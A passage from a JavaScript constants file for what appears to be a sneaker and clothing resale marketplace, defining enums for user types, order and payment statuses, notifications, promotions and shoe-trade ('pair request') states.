    BUYER: "Buyer",
    RETAILER: "Retailer",
    RESELLER: "Reseller",
   
}

export const ENUM_AUTH_PROVIDER_TYPE = {
    EMAIL: "Email",
    GOOGLE: "Google",
    APPLE: "Apple",
   
}

export const ENUM_ORDER_TYPE = {
    BUY_NOW: "Buy Now",
    HOLD: "Hold",
    
}

export const ENUM_PRODUCT_TYPE = {
  SNEAKERS: "Sneaker",
  CLOTHING: "Clothing",  
}

export const ENUM_SUBSCRIPTION_TYPE = {
    SOLO: "Solo",
    COUPLE: "Couple"
}

export const ENUM_ORDER_STATUS = {
    HOLDING: "Holding",
    PLACED: "Placed",
    ACCEPTED: "Accepted",
    READY_FOR_PICKUP: "Ready for Pickup",
    ON_THE_WAY: "On the Way",
    REJECTED: "Rejected",
    COMPLETED: "Completed",
    CANCELLED: "Cancelled",
    PROCESSING: "Processing",
}

export const ENUM_ORDER_ITEM_STATUS = {
    HOLDING: "Holding",
    PLACED: "Placed",
    SHIPPED: "Shipped",
    ACCEPTED: "Accepted",
    READY_FOR_PICKUP: "Ready for Pickup",
    ON_THE_WAY: "On the Way",
     DELIVERED: "Delivered",
    REJECTED: "Rejected",
    COMPLETED: "Completed",
    CANCELLED: "Cancelled",
    PROCESSING: "Processing",
}

export const ENUM_SELLER_SPLIT_ORDER_STATUS = {
    PLACED: "Placed",
    PROCESSING: "Processing",
    SHIPPED: "Shipped",
    DELIVERED: "Delivered",
}

export const ENUM_CART_STATUS = {
    ACTIVE: "Active",
    ORDERED: "Ordered",
    REMOVED: "Removed"
}

export const ENUM_PAYMENT_STATUS = {
   PENDING: "Pending",
   PARTIALLY_PAID: "Partially Paid",
   PAID: "Paid",
   FAILED: "Failed",
   REFUNDED: "Refunded",
}

export const ENUM_PAYMENT_METHOD = {
    STRIPE: "Stripe",
    PAYPAL: "PayPal",
    CREDIT_CARD: "Credit Card",
}

export const ENUM_NOTIFICATION_TYPE = {
    NEW_ORDER : "NEW_ORDER",
    ORDER_ACCEPTED : "ORDER_ACCEPTED",
    ORDER_ON_THE_WAY : "ORDER_ON_THE_WAY",
    ORDER_COMPLETED : "ORDER_COMPLETED",
    ORDER_CONFIRMED : "ORDER_CONFIRMED",
    ORDER_REJECTED : "ORDER_REJECTED",
    ORDER_CANCELLED : "ORDER_CANCELLED",
    PAYMENT_RECEIVED : "PAYMENT_RECEIVED",
    PAYMENT_COMPLETED : "PAYMENT_COMPLETED",
    PAYMENT_FAILED : "PAYMENT_FAILED",
    NEW_PAIR_REQUEST : "NEW_PAIR_REQUEST",
    MADE_COUNTER_OFFER : "MADE_COUNTER-OFFER",
    DEAL_CONFIRMED : "DEAL_CONFIRMED",
    VIEWED_INVENTORY: "VIEWED_INVENTORY",
    ACCEPTED_PAIR_REQUEST: "ACCEPTED_PAIR_REQUEST",
    REJECTED_PAIR_REQUEST: "REJECTED_PAIR_REQUEST",
    STARTED_CONVERSATION: "STARTED_CONVERSATION",
}

export const ENUM_PRODUCT_AVAILABILITY = {
    ACTIVE : "Active",
    ON_HOLD : "On Hold",
    SOLD_OUT : "Sold Out",
    COMING_SOON : "Coming Soon",
    IN_STOCK : "In Stock",
     LOW_STOCK: "Low Stock",

}

export const ENUM_PROMOTION_TYPE = {
    FLASH_SALE : "Flash Sale",
    NEW_ARRIVALS : "New Arrival",
    RESTOCK_ALERT : "Restock Alert",
    EXCLUSIVE_DROP : "Exclusive Drop",
    GENERAL_ANNOUNCEMENT : "General Announcement",

}
export const ENUM_PROMOTION_RECEIVER_TYPE = {
    ALL_MY_FOLLOWERS : "All My Follower",
    NEARBY_CUSTOMERS : "Nearby Customer",
    MY_SIZE_AUDIENCE : "My Size Audience",

}

export const ENUM_PROMOTION_SEND_METHOD = {
    SEND_NOW : "Send Now",
    SCHEDULED : "Scheduled",
    SAVE_DRAFT : "Save Draft",
}

export const ENUM_PROMOTION_STATUS = {
    DRAFT : "Draft",
    SCHEDULED : "Scheduled",
    SENDING : "Sending",
    SENT : "Sent",
    FAILED : "Failed",
}

export const ENUM_PAIR_REQUEST_STATUS = {
    ACCEPTED : "Accepted",
    REJECTED : "Rejected",
    PENDING : "Pending",
    COUNTER: "Counter",
    DECLINE: "Decline",
    COMPLETED: "Completed",
    DELIVEREd: "Delivered",
}

export const ENUM_OLD_PAIR_CONTITION = {
    DEADSTOCK : "Deadstock",
    NEAR_DEADSTOCK : "Near Deadstock",
    VERY_GOOD : "Very Good",
    GOOD: "Good",
    
}

export const ENUM_OLD_PAIR_STATUS = {
    ACCEPTED : "Accepted",
    REJECTED : "Rejected",
    PENDING : "Pending",
    COUNTER: "Counter",
    DECLINE: "Decline",
    COMPLETED: "Completed",
    DELIVEREd: "Delivered",
    
}
```
